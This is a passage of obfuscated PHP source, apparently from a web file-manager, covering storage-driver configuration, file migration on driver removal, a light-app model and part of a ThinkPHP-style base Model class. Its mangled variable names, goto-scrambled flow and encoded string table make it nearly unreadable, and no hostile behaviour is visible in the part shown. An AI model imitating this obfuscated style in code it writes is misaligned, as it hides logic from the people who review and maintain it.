. $e„ÓÙÔ×´à[2372]; $d¨òğŠŞÌ = Model($e„ÓÙÔ×´à[700])->query($bµÆÎò¼ùŠ); $d¨òğŠŞÌ = array_to_keyvalue($d¨òğŠŞÌ, $e„ÓÙÔ×´à[367], $e„ÓÙÔ×´à[77]); foreach ($A°¿ô“Ìğï as $Aô•Ü•â‘ => $A´œÑ½·Ë) { $A°¿ô“Ìğï[$Aô•Ü•â‘][$e„ÓÙÔ×´à[2080]] = isset($d¨òğŠŞÌ[$A´œÑ½·Ë[$e„ÓÙÔ×´à[367]]]) ? $d¨òğŠŞÌ[$A´œÑ½·Ë[$e„ÓÙÔ×´à[367]]] : 0; } } public function getConfig($E®öŒİŞÒ›) { $eÃ´çêá÷ = parent::listData($E®öŒİŞÒ›); return json_decode($eÃ´çêá÷[$_SERVER[í™][6]], !0); } public function update($Aö·¼¼èğ, $cÍ¦ŞíÌÕª) { goto D†ñŞ‹ˆßŠ; CÍÌ”–Çğ¬: if (isset($BÑ¹£ˆËÓ[$c¡Ğšöï«]) && $BÑ¹£ˆËÓ[$c¡Ğšöï«][$Dµ«ãÇ³·Ş[367]] != $Aö·¼¼èğ) { return !1; } if (isset($cÍ¦ŞíÌÕª[$Dµ«ãÇ³·Ş[2373]]) && $cÍ¦ŞíÌÕª[$Dµ«ãÇ³·Ş[2373]] == $Dµ«ãÇ³·Ş[83]) { $this->checkConfig($cÍ¦ŞíÌÕª); } unset($cÍ¦ŞíÌÕª[$Dµ«ãÇ³·Ş[2373]]); goto dÎíÇ—ä¡‘; D†ñŞ‹ˆßŠ: $Dµ«ãÇ³·Ş =& $_SERVER[í™]; $c¡Ğšöï« = $cÍ¦ŞíÌÕª[$Dµ«ãÇ³·Ş[28]]; $BÑ¹£ˆËÓ = array_to_keyvalue(parent::listData(), $Dµ«ãÇ³·Ş[28]); goto CÍÌ”–Çğ¬; dÎíÇ—ä¡‘: $d¿¶Ú­Ì—ù = parent::update($Aö·¼¼èğ, $cÍ¦ŞíÌÕª); if ($d¿¶Ú­Ì—ù && $cÍ¦ŞíÌÕª[$Dµ«ãÇ³·Ş[34]]) { foreach ($BÑ¹£ˆËÓ as $F¯ôÍ–„è¯) { if ($F¯ôÍ–„è¯[$Dµ«ãÇ³·Ş[34]] && $F¯ôÍ–„è¯[$Dµ«ãÇ³·Ş[367]] != $Aö·¼¼èğ) { parent::update($F¯ôÍ–„è¯[$Dµ«ãÇ³·Ş[367]], array($Dµ«ãÇ³·Ş[34] => 0)); } } } return $d¿¶Ú­Ì—ù; goto D ù†øÜÎã; D ù†øÜÎã: } public function add($b‰Öªá¤ªã) { goto aåœèòÍ¨ğ; f÷Ê¹»âõï: $this->checkConfig($b‰Öªá¤ªã); $Aåœ¼³Ó„¢ = parent::insert($b‰Öªá¤ªã); if ($Aåœ¼³Ó„¢ && $b‰Öªá¤ªã[$fŒˆ…óÆÀŒ[34]]) { foreach ($CåîÛö¢º as $aá±ˆÆ¶ØÅ) { if ($aá±ˆÆ¶ØÅ[$fŒˆ…óÆÀŒ[34]]) { parent::update($aá±ˆÆ¶ØÅ[$fŒˆ…óÆÀŒ[367]], array($fŒˆ…óÆÀŒ[34] => 0)); } } } goto B·ù™Á—…»; aåœèòÍ¨ğ: $fŒˆ…óÆÀŒ =& $_SERVER[í™]; $CåîÛö¢º = array_to_keyvalue(parent::listData(), $fŒˆ…óÆÀŒ[28]); if (isset($CåîÛö¢º[$b‰Öªá¤ªã[$fŒˆ…óÆÀŒ[28]]])) { return !1; } goto f÷Ê¹»âõï; B·ù™Á—…»: return $Aåœ¼³Ó„¢; goto FŠ¥¸ë§†ç; FŠ¥¸ë§†ç: } public function checkConfig(&$fÂ…º……áÆ) { goto FåŒš¿÷ë‹; f¬ïÆºËŒ: foreach ($cÈ©ŠŠŞ§Â as $DÕÇñ‡ğÒù => $c¡–á‡Ø¾å) { $cÈ©ŠŠŞ§Â[$DÕÇñ‡ğÒù] = trim($c¡–á‡Ø¾å); } $cÈ©ŠŠŞ§Â[$eä±£Î¢ÈÏ[2374]] = rand_string(6); $D‚ÔŒ‡ÀŒ® = $this->driverType($Aù…ù³‡»); goto BÔ³˜Ó¼ì†; b¢›–º‹†Œ: $cÈ©ŠŠŞ§Â[$eä±£Î¢ÈÏ[1010]] = $c¤¶Ã‡“Œ…; $fÂ…º……áÆ[$eä±£Î¢ÈÏ[6]] = json_encode($cÈ©ŠŠŞ§Â); $fÂ…º……áÆ[$eä±£Î¢ÈÏ[90]] = $D‚ÔŒ‡ÀŒ®; goto A„É¹º×¬¡; BÔ³˜Ó¼ì†: $dóé­†”ö³ = $eä±£Î¢ÈÏ[71] . $D‚ÔŒ‡ÀŒ®; $EšÛ‘ÏÔŒ = new $dóé­†”ö³($cÈ©ŠŠŞ§Â); if (in_array($Aù…ù³‡», $EšÛ‘ÏÔŒ->objectDriver)) { if (!$EšÛ‘ÏÔŒ->isBucketCors() && !$EšÛ‘ÏÔŒ->setBucketCors()) { $fŞ½ÑÖªÁ = LNG($eä±£Î¢ÈÏ[2375]); $fŞ½ÑÖªÁ .= $eä±£Î¢ÈÏ[2376] . LNG($eä±£Î¢ÈÏ[2377]); show_json($fŞ½ÑÖªÁ, !1); } } goto f¦­—È‘¾µ; f¦­—È‘¾µ: $c¤¶Ã‡“Œ… = rtrim($cÈ©ŠŠŞ§Â[$eä±£Î¢ÈÏ[1010]], $eä±£Î¢ÈÏ[8]) . $eä±£Î¢ÈÏ[8]; $E½ëò÷ƒ÷¤ = $EšÛ‘ÏÔŒ->getPath($c¤¶Ã‡“Œ… . $eä±£Î¢ÈÏ[1975]); if (!$EšÛ‘ÏÔŒ->mkfile($E½ëò÷ƒ÷¤)) { show_json(LNG($eä±£Î¢ÈÏ[2375]), !1); } goto b¢›–º‹†Œ; A„É¹º×¬¡: return !0; goto F‰„Íòë«¼; FåŒš¿÷ë‹: $eä±£Î¢ÈÏ =& $_SERVER[í™]; $Aù…ù³‡» = strtolower($fÂ…º……áÆ[$eä±£Î¢ÈÏ[90]]); $cÈ©ŠŠŞ§Â = json_decode($fÂ…º……áÆ[$eä±£Î¢ÈÏ[6]], !0); goto f¬ïÆºËŒ; F‰„Íòë«¼: } private function driverType($eÃÅÜÇÊ¼…) { $c¶Ï†á®‚Ş =& $_SERVER[í™]; $d“øÉ÷’á‹ = array($c¶Ï†á®‚Ş[102] => $c¶Ï†á®‚Ş[2378], $c¶Ï†á®‚Ş[58] => $c¶Ï†á®‚Ş[2379], $c¶Ï†á®‚Ş[64] => $c¶Ï†á®‚Ş[2380]); if (isset($d“øÉ÷’á‹[$eÃÅÜÇÊ¼…])) { return $d“øÉ÷’á‹[$eÃÅÜÇÊ¼…]; } return strtoupper($eÃÅÜÇÊ¼…); } public function driverListSystem() { $D‰æ…™¶–° =& $_SERVER[í™]; $AîåÒËñ = parent::listData(); $A†›“²Œ„Ñ = array(); foreach ($AîåÒËñ as $FñÍ…ÒÔï) { unset($FñÍ…ÒÔï[$D‰æ…™¶–°[187]], $FñÍ…ÒÔï[$D‰æ…™¶–°[107]]); $FñÍ…ÒÔï[$D‰æ…™¶–°[6]] = json_decode($FñÍ…ÒÔï[$D‰æ…™¶–°[6]], !0); $A†›“²Œ„Ñ[] = $FñÍ…ÒÔï; } return $A†›“²Œ„Ñ; } public function defaultDriver() { $c‚ÌÃƒ¼ò§ =& $_SERVER[í™]; $bà¢¾³’¢ = parent::listData(); $E‡ùœ–­©º = array_filter_by_field($bà¢¾³’¢, $c‚ÌÃƒ¼ò§[34], 1); $E‡ùœ–­©º = $E‡ùœ–­©º[0]; if ($E‡ùœ–­©º) { $E‡ùœ–­©º[$c‚ÌÃƒ¼ò§[6]] = json_decode($E‡ùœ–­©º[$c‚ÌÃƒ¼ò§[6]], !0); } return $E‡ùœ–­©º; } public function driverInfo($CÎå³®†‹) { $a·ßŒ…ÈÓÔ =& $_SERVER[í™]; $bÊĞØğ±Ï÷ = array_to_keyvalue(parent::listData(), $a·ßŒ…ÈÓÔ[367]); if (!isset($bÊĞØğ±Ï÷[$CÎå³®†‹])) { return !1; } $Eò‹åÀÂ„ = $bÊĞØğ±Ï÷[$CÎå³®†‹]; $Eò‹åÀÂ„[$a·ßŒ…ÈÓÔ[6]] = json_decode($Eò‹åÀÂ„[$a·ßŒ…ÈÓÔ[6]], !0); return $Eò‹åÀÂ„; } public function remove($cÓÛïãŒÒÍ) { $this->removeShareItems($cÓÛïãŒÒÍ); return parent::remove($cÓÛïãŒÒÍ); } public function removeWithFile($eÀõ‰ù›èâ) { goto E¤–½ë•Ù; d¥ßªØéÆ: $E›ÍÍÇñ—ö = "\173\x69\157\x3a{$dî¬ì¾ó¶}\175\x2f"; $aà–’¡­¨– = !0; $C˜ñ°Òç©ê = array(); goto FæÊóêŸßó; E¤–½ë•Ù: $f¥¹Î†ÈĞÔ =& $_SERVER[í™]; $Aø´ò‹ÕÃÇ = array($f¥¹Î†ÈĞÔ[725] => $eÀõ‰ù›èâ); $Fˆ¡©»Éî = Model($f¥¹Î†ÈĞÔ[422])->where($Aø´ò‹ÕÃÇ)->count(); goto BëÅñŠ´ø™; FæÊóêŸßó: $B–²Â‚âòÃ = Model($f¥¹Î†ÈĞÔ[167])->where($Aø´ò‹ÕÃÇ)->field($f¥¹Î†ÈĞÔ[2384])->select(); foreach ($B–²Â‚âòÃ as $cŞÑ›ÙÃçà) { goto E›‘Ş½¥ù˜; bÍÜÑİ’£¤: $AÓ¶Ê¥¿é» = array($f¥¹Î†ÈĞÔ[725] => $dî¬ì¾ó¶, $f¥¹Î†ÈĞÔ[75] => $cÊóç˜ñÈ‚); Model($f¥¹Î†ÈĞÔ[167])->where($Aø´ò‹ÕÃÇ)->save($AÓ¶Ê¥¿é»); goto E°–ëöŒ®; E›‘Ş½¥ù˜: $bØ™ÚÉ÷ˆÂ = $cŞÑ›ÙÃçà[$f¥¹Î†ÈĞÔ[75]]; $cÊóç˜ñÈ‚ = $E›ÍÍÇñ—ö . str_replace("\x7b\151\x6f\x3a{$eÀõ‰ù›èâ}\175\57", $f¥¹Î†ÈĞÔ[33], $bØ™ÚÉ÷ˆÂ); if (!IO::exist($bØ™ÚÉ÷ˆÂ)) { $C˜ñ°Òç©ê[] = $cŞÑ›ÙÃçà[$f¥¹Î†ÈĞÔ[419]]; $bØšÆĞ“Ï¬->updateFileEnd($cŞÑ›ÙÃçà[$f¥¹Î†ÈĞÔ[28]], $cŞÑ›ÙÃçà[$f¥¹Î†ÈĞÔ[77]]); continue; } goto Fğë”ÁÊáÜ; Fğë”ÁÊáÜ: if (IO::exist($cÊóç˜ñÈ‚)) { $bØšÆĞ“Ï¬->updateFileEnd($cŞÑ›ÙÃçà[$f¥¹Î†ÈĞÔ[28]], $cŞÑ›ÙÃçà[$f¥¹Î†ÈĞÔ[77]]); continue; } if (!IO::move($bØ™ÚÉ÷ˆÂ, get_path_father($cÊóç˜ñÈ‚))) { $aà–’¡­¨– = !1; break; } $Aø´ò‹ÕÃÇ = array($f¥¹Î†ÈĞÔ[419] => $cŞÑ›ÙÃçà[$f¥¹Î†ÈĞÔ[419]]); goto bÍÜÑİ’£¤; E°–ëöŒ®: } $this->removeByFileID($C˜ñ°Òç©ê); goto DàŒ³Àå¾Ä; DàŒ³Àå¾Ä: if (!$aà–’¡­¨–) { $bØšÆĞ“Ï¬->stop($bÊ¡‹ôåŒä); return !1; } $bØšÆĞ“Ï¬->end(); $this->remove($eÀõ‰ù›èâ); goto d‰—³Óõø; aÃã•‘çÏ¡: $bØšÆĞ“Ï¬->task[$f¥¹Î†ÈĞÔ[680]] = (double) $D‚ï¥÷„èÎ; $Aé²îŠÄ²ƒ = KodIO::defaultDriver(); $dî¬ì¾ó¶ = $Aé²îŠÄ²ƒ[$f¥¹Î†ÈĞÔ[367]]; goto d¥ßªØéÆ; BëÅñŠ´ø™: $D‚ï¥÷„èÎ = Model($f¥¹Î†ÈĞÔ[422])->where($Aø´ò‹ÕÃÇ)->sum($f¥¹Î†ÈĞÔ[77]); $bÊ¡‹ôåŒä = $f¥¹Î†ÈĞÔ[2381] . $eÀõ‰ù›èâ; $bØšÆĞ“Ï¬ = new TaskFileTransfer($bÊ¡‹ôåŒä, $f¥¹Î†ÈĞÔ[2382], $Fˆ¡©»Éî, LNG($f¥¹Î†ÈĞÔ[2383]) . "\x28{$eÀõ‰ù›èâ}\51"); goto aÃã•‘çÏ¡; d‰—³Óõø: } public function progress($DãšÎ»—Õ‡) { return Task::get($_SERVER[í™][2381] . $DãšÎ»—Õ‡); } private function removeByFileID($CŠÚ›‚Œ›¦ = array()) { goto AˆÆ¢É¼²; cÚ„·ÀÜ¥Ø: $E¿ñÔßï¢Â = Model($E‡ë§¡­©¼[1103])->where($d¦‘Ö¼Óâ )->field($E‡ë§¡­©¼[369])->select(); if (!$E¿ñÔßï¢Â) { return; } $E¿ñÔßï¢Â = array_to_keyvalue($E¿ñÔßï¢Â, $E‡ë§¡­©¼[33], $E‡ë§¡­©¼[369]); goto c™Î‚¯Ú³Î; c™Î‚¯Ú³Î: foreach ($E¿ñÔßï¢Â as $eØ´ª×êéŠ) { Model($E‡ë§¡­©¼[382])->removeNow($eØ´ª×êéŠ, !1); } goto d»µ‹Ú“±; AˆÆ¢É¼²: $E‡ë§¡­©¼ =& $_SERVER[í™]; if (empty($CŠÚ›‚Œ›¦)) { return; } $d¦‘Ö¼Óâ  = array($E‡ë§¡­©¼[419] => array($E‡ë§¡­©¼[7], $CŠÚ›‚Œ›¦)); goto cÚ„·ÀÜ¥Ø; d»µ‹Ú“±: } private function removeShareItems($bªøê£­¿¿) { goto Eø§¯¤Â‹·; Aà”ø©Ï: Model($EŒ¬î“õ·¥[538])->remove($fé´Õ´æØ); goto dÂ…ŒÜ„¨; Eø§¯¤Â‹·: $EŒ¬î“õ·¥ =& $_SERVER[í™]; $DĞ¤•å©å° = "\x7b\151\x6f\x3a{$bªøê£­¿¿}\175\x2f"; $aà„³İåâ = array($EŒ¬î“õ·¥[369] => 0, $EŒ¬î“õ·¥[1005] => array($EŒ¬î“õ·¥[733], "{$DĞ¤•å©å°}\45")); goto FœÑéº—“³; FœÑéº—“³: $D’•®’¤å = Model($EŒ¬î“õ·¥[2071])->where($aà„³İåâ)->field($EŒ¬î“õ·¥[441])->select(); if (empty($D’•®’¤å)) { return; } $fé´Õ´æØ = array_to_keyvalue($D’•®’¤å, $EŒ¬î“õ·¥[33], $EŒ¬î“õ·¥[441]); goto Aà”ø©Ï; dÂ…ŒÜ„¨: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\x6d\x2e\x4c\x69\x67\150\x74\x41\160\160"; public $modelType = "\x53\171\x73\x74\145\x6d\x4f\x70\x74\151\x6f\156"; public $field = array("\156\141\155\x65", "\x67\162\157\x75\x70", "\x64\x65\x73\x63", "\x63\157\x6e\x74\145\156\164"); public function listData($b™ô™Îçˆø = false, $DÈØ‰åÊÁ = "\x6d\x6f\x64\151\146\x79\x54\x69\x6d\145", $aŒíˆºÊÖ¦ = true) { return parent::listData($b™ô™Îçˆø, $DÈØ‰åÊÁ, $aŒíˆºÊÖ¦); } public function remove($AÕ‹øğ‚Ğ) { $C‘ÙìÈöïì = $this->findByName($AÕ‹øğ‚Ğ); if (!$C‘ÙìÈöïì) { return !1; } return parent::remove($C‘ÙìÈöïì[$_SERVER[í™][367]]); } public function add($BŞŠ“Ø„¯“) { if ($this->findByName($BŞŠ“Ø„¯“[$_SERVER[í™][28]])) { return !1; } return parent::insert($BŞŠ“Ø„¯“); } public function update($C¯âêÈ‹·ö, $añ¤Ü†Åñ) { $BÓ·í”‡„Ä =& $_SERVER[í™]; $eÊ¸ùâˆŒù = $this->findByName($C¯âêÈ‹·ö); $aòè¢¨éÍ = $this->findByName($añ¤Ü†Åñ[$BÓ·í”‡„Ä[28]]); if (!$eÊ¸ùâˆŒù || $aòè¢¨éÍ && $aòè¢¨éÍ[$BÓ·í”‡„Ä[367]] != $eÊ¸ùâˆŒù[$BÓ·í”‡„Ä[367]]) { return !1; } return parent::update($eÊ¸ùâˆŒù[$BÓ·í”‡„Ä[367]], $añ¤Ü†Åñ); } } goto bî¸™ ‹¬¬; Cµ·Ì«˜ËÂ: define($_SERVER[í™][230], 0); define($_SERVER[í™][231], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\154\145", "\x6f\x72\x64\145\x72", "\x61\x6c\151\x61\x73", "\x68\141\166\x69\x6e\147", "\x67\x72\157\x75\160", "\154\x6f\143\153", "\144\151\163\x74\x69\156\143\x74", "\x61\165\x74\x6f", "\146\x69\x6c\164\x65\x72", "\x76\141\154\x69\144\x61\x74\x65", "\162\x65\163\x75\154\x74", "\x62\x69\x6e\x64", "\x74\x6f\x6b\x65\x6e"); public function __construct($dè”èÕˆÄî = '', $Aïİ¥É½ÎŸ = '', $bÁºİ£¯©÷ = '') { $D³­Ğö›æ£ =& $_SERVER[í™]; $this->_initialize(); if (!empty($dè”èÕˆÄî)) { if (strpos($dè”èÕˆÄî, $D³­Ğö›æ£[91])) { list($this->dbName, $this->name) = explode($D³­Ğö›æ£[91], $dè”èÕˆÄî); } else { $this->name = $dè”èÕˆÄî; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($Aïİ¥É½ÎŸ)) { $this->tablePrefix = $D³­Ğö›æ£[33]; } elseif ($D³­Ğö›æ£[33] != $Aïİ¥É½ÎŸ) { $this->tablePrefix = $Aïİ¥É½ÎŸ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($D³­Ğö›æ£[232]); } $this->db(0, empty($this->connection) ? $bÁºİ£¯©÷ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $a§‘¦ìØÅ =& $_SERVER[í™]; if (empty($this->fields)) { if (think_config($a§‘¦ìØÅ[233])) { $e¬ğ¹¨»¦î = $this->dbName ? $this->dbName : think_config($a§‘¦ìØÅ[234]); $b“¦Ÿ©ƒ¬± = think_var_cache($a§‘¦ìØÅ[235] . strtolower(get_path_this($e¬ğ¹¨»¦î) . $a§‘¦ìØÅ[91] . $this->name)); if ($b“¦Ÿ©ƒ¬±) { $a ‘ÉÚ£ŒÅ = think_config($a§‘¦ìØÅ[236]); if (empty($a ‘ÉÚ£ŒÅ) || $b“¦Ÿ©ƒ¬±[$a§‘¦ìØÅ[237]] == $a ‘ÉÚ£ŒÅ) { $this->fields = $b“¦Ÿ©ƒ¬±; return; } } } $this->flush(); } } public function flush() { goto D–ÁõÂõñ; D–ÁõÂõñ: $bÍ´„Öˆ¼ê =& $_SERVER[í™]; $this->db->setModel($this->name); $DÓåÊ¿çãŸ = $this->db->getFields($this->getTableName()); goto fŞÄËÂ…; fŞÄËÂ…: if (!$DÓåÊ¿çãŸ) { return !1; } $this->fields = array_keys($DÓåÊ¿çãŸ); $this->fields[$bÍ´„Öˆ¼ê[238]] = !1; goto d„ïÎÃÂ®; d„ïÎÃÂ®: foreach ($DÓåÊ¿çãŸ as $BçŒ‘Â—â¹ => $C×–ØãÂ²¤) { $Fí‰‰×¨‰’[$BçŒ‘Â—â¹] = $C×–ØãÂ²¤[$bÍ´„Öˆ¼ê[29]]; if ($C×–ØãÂ²¤[$bÍ´„Öˆ¼ê[36]]) { $this->fields[$bÍ´„Öˆ¼ê[239]] = $BçŒ‘Â—â¹; if ($C×–ØãÂ²¤[$bÍ´„Öˆ¼ê[39]]) { $this->fields[$bÍ´„Öˆ¼ê[238]] = !0; } } } $this->fields[$bÍ´„Öˆ¼ê[240]] = $Fí‰‰×¨‰’; if (think_config($bÍ´„Öˆ¼ê[236])) { $this->fields[$bÍ´„Öˆ¼ê[237]] = think_config($bÍ´„Öˆ¼ê[236]); } goto c±¬°ã¼£ƒ; c±¬°ã¼£ƒ: if (think_config($bÍ´„Öˆ¼ê[233])) { $f Òã×‹éØ = $this->dbName ? $this->dbName : think_config($bÍ´„Öˆ¼ê[234]); think_var_cache($bÍ´„Öˆ¼ê[235] . strtolower(get_path_this($f Òã×‹éØ) . $bÍ´„Öˆ¼ê[91] . $this->name), $this->fields); } goto FÉ¸»£ìÚå; FÉ¸»£ìÚå: } public function switchModel($eÏß‡í‚÷‚, $E£ŒØä»öé = array()) { $FÕ¢Õ±ê²Ô =& $_SERVER[í™]; $DÇà¶«‰œØ = ucwords(strtolower($eÏß‡í‚÷‚)) . $FÕ¢Õ±ê²Ô[241]; if (!class_exists($DÇà¶«‰œØ)) { think_exception($DÇà¶«‰œØ . think_lang($FÕ¢Õ±ê²Ô[242])); } $this->_extModel = new $DÇà¶«‰œØ($this->name); if (!empty($E£ŒØä»öé)) { foreach ($E£ŒØä»öé as $aï·–ŸäĞ) { $this->_extModel->setProperty($aï·–ŸäĞ, $this->{$aï·–ŸäĞ}); } } return $this->_extModel; } public function __set($aá³‡„½éË, $Cø¿ÍáİŸï) { $this->data[$aá³‡„½éË] = $Cø¿ÍáİŸï; } public function __get($B‘±‹°áÒË) { return isset($this->data[$B‘±‹°áÒË]) ? $this->data[$B‘±‹°áÒË] : null; } public function __isset($eš†Èëî‹ğ) { return isset($this->data[$eš†Èëî‹ğ]); } public function __unset($E¼Ğ§ÇÈ«) { unset($this->data[$E¼Ğ§ÇÈ«]); } public function __call($FÏ»á·»÷Í, $bùÖ¹†âÃ) { $D‡¼´·Õ¾‹ =& $_SERVER[í™]; if (in_array(strtolower($FÏ»á·»÷Í), $this->methods, !0)) { $this->options[strtolower($FÏ»á·»÷Í)] = $bùÖ¹†âÃ[0]; return $this; } elseif (in_array(strtolower($FÏ»á·»÷Í), array($D‡¼´·Õ¾‹[243], $D‡¼´·Õ¾‹[244], $D‡¼´·Õ¾‹[245], $D‡¼´·Õ¾‹[246], $D‡¼´·Õ¾‹[247]), !0)) { $a¼—Ê„×£Ğ = isset($bùÖ¹†âÃ[0]) ? $bùÖ¹†âÃ[0] : $D‡¼´·Õ¾‹[176]; $a¼—Ê„×£Ğ = $this->db->parseKey($a¼—Ê„×£Ğ); return $this->getField(strtoupper($FÏ»á·»÷Í) . $D‡¼´·Õ¾‹[248] . $a¼—Ê„×£Ğ . $D‡¼´·Õ¾‹[249] . $FÏ»á·»÷Í, $D‡¼´·Õ¾‹[243]); } elseif (strtolower(substr($FÏ»á·»÷Í, 0, 5)) == $D‡¼´·Õ¾‹[250]) { $a¼—Ê„×£Ğ = think_parse_name(substr($FÏ»á·»÷Í, 5)); $EÏ©öˆª¡[$a¼—Ê„×£Ğ] = $bùÖ¹†âÃ[0]; return $this->where($EÏ©öˆª¡)->find(); } elseif (strtolower(substr($FÏ»á·»÷Í, 0, 10)) == $D‡¼´·Õ¾‹[251]) { $FĞ¡ÈãİÏŒ = think_parse_name(substr($FÏ»á·»÷Í, 10)); $EÏ©öˆª¡[$FĞ¡ÈãİÏŒ] = $bùÖ¹†âÃ[0]; return $this->where($EÏ©öˆª¡)->getField($bùÖ¹†âÃ[1]); } elseif (isset($this->_scope[$FÏ»á·»÷Í])) { return $this->scope($FÏ»á·»÷Í, $bùÖ¹†âÃ[0]); } elseif (method_exists($this, $FÏ»á·»÷Í)) { array_unshift($bùÖ¹†âÃ, $FÏ»á·»÷Í); return call_user_func_array(array($this, $D‡¼´·Õ¾‹[252]), $bùÖ¹†âÃ); } else { return call_user_func_array(array(parent, $FÏ»á·»÷Í), $bùÖ¹†âÃ); } } protected function call() { goto FÁß¢Ï³; FÁß¢Ï³: $Fæ³Äãåî =& $_SERVER[í™]; $F”Íì¤ÊÃŸ = func_get_args(); $fß¤“ª¹š¼ = array_shift($F”Íì¤ÊÃŸ); goto e½ÈØ¹†çÕ; cİ†•–Õºö: if (isset($F”Íì¤ÊÃŸ[$E¨´ÑÂ˜ä]) && $F”Íì¤ÊÃŸ[$E¨´ÑÂ˜ä] === $fß¤“ª¹š¼) { think_exception(__CLASS__ . $Fæ³Äãåî[4] . $fß¤“ª¹š¼ . think_lang($Fæ³Äãåî[253])); return; } $F”Íì¤ÊÃŸ[] = $fß¤“ª¹š¼; if (method_exists($this, $Fæ³Äãåî[254])) { $aáïÊëèÃ = call_user_func_array(array($this, $Fæ³Äãåî[255]), array($a„·Ò¶ˆÚ§, $F”Íì¤ÊÃŸ)); if (!is_null($aáïÊëèÃ) && $aáïÊëèÃ !== !1) { return $aáïÊëèÃ; } } goto f¡‘è„ñÍ; f¡‘è„ñÍ: $FÕœ”ğ¥¤™ = call_user_func_array(array($this, $fß¤“ª¹š¼), $F”Íì¤ÊÃŸ); if (method_exists($this, $Fæ³Äãåî[256])) { $aáïÊëèÃ = call_user_func_array(array($this, $Fæ³Äãåî[257]), array($a„·Ò¶ˆÚ§, $F”Íì¤ÊÃŸ, $FÕœ”ğ¥¤™)); if ($aáïÊëèÃ) { return $aáïÊëèÃ; } } return $FÕœ”ğ¥¤™; goto aˆƒ‹£¥™Ú; e½ÈØ¹†çÕ: $a„·Ò¶ˆÚ§ = $fß¤“ª¹š¼; if (is_array($fß¤“ª¹š¼)) { $a„·Ò¶ˆÚ§ = $fß¤“ª¹š¼[1]; $fß¤“ª¹š¼ = $fß¤“ª¹š¼[0]; } $E¨´ÑÂ˜ä = count($F”Íì¤ÊÃŸ) - 1; goto cİ†•–Õºö; aˆƒ‹£¥™Ú: } protected function _initialize() { } protected function _facade($fÌì«‰ÍÂ) { $DÈ²áµ½µ =& $_SERVER[í™]; if (!empty($this->fields)) { foreach ($fÌì«‰ÍÂ as $a¦¸è‚˜—É => $B¿ØøíÖöò) { if (!in_array($a¦¸è‚˜—É, $this->fields, !0)) { unset($fÌì«‰ÍÂ[$a¦¸è‚˜—É]); } elseif (is_scalar($B¿ØøíÖöò)) { $this->_parseType($fÌì«‰ÍÂ, $a¦¸è‚˜—É); } } } if (!empty($this->options[$DÈ²áµ½µ[258]])) { $fÌì«‰ÍÂ = array_map($this->options[$DÈ²áµ½µ[258]], $fÌì«‰ÍÂ); unset($this->options[$DÈ²áµ½µ[258]]); } $this->_beforeWrite($fÌì«‰ÍÂ); return $fÌì«‰ÍÂ; } protected function _beforeWrite(&$CŞéÊŒ†) { } public function add($d‹ ŞÄ³òŸ = '', $cñÈ¸™İé’ = array(), $A„µ ŒĞçŸ = false) { goto d„ìßÂ÷†; d„ìßÂ÷†: if (empty($d‹ ŞÄ³òŸ)) { if (!empty($this->data)) { $d‹ ŞÄ³òŸ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[í™][259]); return !1; } } $cñÈ¸™İé’ = $this->_parseOptions($cñÈ¸™İé’); $d‹ ŞÄ³òŸ = $this->_facade($d‹ ŞÄ³òŸ); goto E’ĞôåÀË; eŠ©‰¾‡ã: return $cçô÷‚ƒİ; goto b¦‰¬Î‡Ä¯; E’ĞôåÀË: if (!1 === $this->_beforeInsert($d‹ ŞÄ³òŸ, $cñÈ¸™İé’)) { return !1; } $cçô÷‚ƒİ = $this->db->insert($d‹ ŞÄ³òŸ, $cñÈ¸™İé’, $A„µ ŒĞçŸ); if (!1 !== $cçô÷‚ƒİ) { $b†Ëñ×ÛàÎ = $this->getLastInsID(); if ($b†Ëñ×ÛàÎ) { $d‹ ŞÄ³òŸ[$this->getPk()] = $b†Ëñ×ÛàÎ; $this->_after_insert($d‹ ŞÄ³òŸ, $cñÈ¸™İé’); return $b†Ëñ×ÛàÎ; } $this->_after_insert($d‹ ŞÄ³òŸ, $cñÈ¸™İé’); } goto eŠ©‰¾‡ã; b¦‰¬Î‡Ä¯: } protected function _beforeInsert(&$c˜ÕèÈàµ½, $fÏ½Ô×îˆ­) { } protected function _after_insert($eÑ¯ÚåÁäŸ, $a©½ºÎîë†) { } public function addAll($cŠì´Ã¹³, $e¯Ü¹˜ö‰¸ = array(), $cœ‚ñ¬ßéÆ = false) { goto A„‰“ßƒ·ƒ; eáØ›¨ÇØŒ: return $aï±Òæõ£Ó; goto E‡ºÔ­ìõ¥; bÆÇÉ¶ÓÓ¦: foreach ($cŠì´Ã¹³ as $cÉĞ×åë„“ => $eŒË‘•Ş–) { $cŠì´Ã¹³[$cÉĞ×åë„“] = $this->_facade($eŒË‘•Ş–); } if (method_exists($this->db, $dÌ˜£ˆßîí[260])) { $aï±Òæõ£Ó = $this->db->insertAll($cŠì´Ã¹³, $e¯Ü¹˜ö‰¸, $cœ‚ñ¬ßéÆ); } else { $this->startTrans(); foreach ($cŠì´Ã¹³ as $cÉĞ×åë„“ => $eŒË‘•Ş–) { $aï±Òæõ£Ó = $this->db->insert($eŒË‘•Ş–, $e¯Ü¹˜ö‰¸, $cœ‚ñ¬ßéÆ); } $this->commit(); } if (!1 !== $aï±Òæõ£Ó) { $FóØ¥Î‹¨ = $this->getLastInsID(); if ($FóØ¥Î‹¨) { return $FóØ¥Î‹¨; } } goto eáØ›¨ÇØŒ; A„‰“ßƒ·ƒ: $dÌ˜£ˆßîí =& $_SERVER[í™]; if (empty($cŠì´Ã¹³)) { $this->error = think_lang($dÌ˜£ˆßîí[259]); return !1; } $e¯Ü¹˜ö‰¸ = $this->_parseOptions($e¯Ü¹˜ö‰¸); goto bÆÇÉ¶ÓÓ¦; E‡ºÔ­ìõ¥: } public function selectAdd($Dç²ì‘˜Œî = '', $eõÚ¥Òö‰ = '', $EÜ ²§éç = array()) { $bñ‡ÚÔÛµ„ =& $_SERVER[í™]; $EÜ ²§éç = 